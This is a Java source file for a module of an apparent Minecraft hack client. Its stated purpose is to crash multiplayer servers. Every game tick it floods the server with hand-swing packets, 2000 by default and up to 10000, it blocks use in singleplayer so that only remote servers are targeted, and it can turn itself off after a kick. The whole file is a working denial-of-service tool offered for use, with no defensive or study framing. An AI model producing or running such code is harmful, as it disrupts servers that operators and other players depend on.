package mathax.client.systems.modules.crash;
import mathax.client.eventbus.EventHandler;
import mathax.client.events.game.GameLeftEvent;
import mathax.client.events.world.TickEvent;
import mathax.client.settings.BoolSetting;
import mathax.client.settings.IntSetting;
import mathax.client.settings.Setting;
import mathax.client.settings.SettingGroup;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.util.Hand;

public class SwingCrash extends Module {
    private final Setting<Integer> amount;
    private final Setting<Boolean> autoDisable;

    public SwingCrash() {
        super(Categories.Crash, Items.GOLDEN_SWORD, "Swing Crash", "CRYSTAL || Attempts to crash the server by spamming hand swing packets.");

        SettingGroup sgGeneral = this.settings.getDefaultGroup();

        this.amount = sgGeneral.add((new IntSetting.Builder())
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(2000)
            .min(1)
            .sliderMin(1)
            .sliderMax(10000)
            .build());

        this.autoDisable = sgGeneral.add((new BoolSetting.Builder())
            .name("auto-disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build());
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if(!mc.isInSingleplayer()) {
            for(int i = 0; i < this.amount.get(); ++i) {
                if (mc.player != null) {
                    mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                }
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) {
            toggle();
        }
    }
}
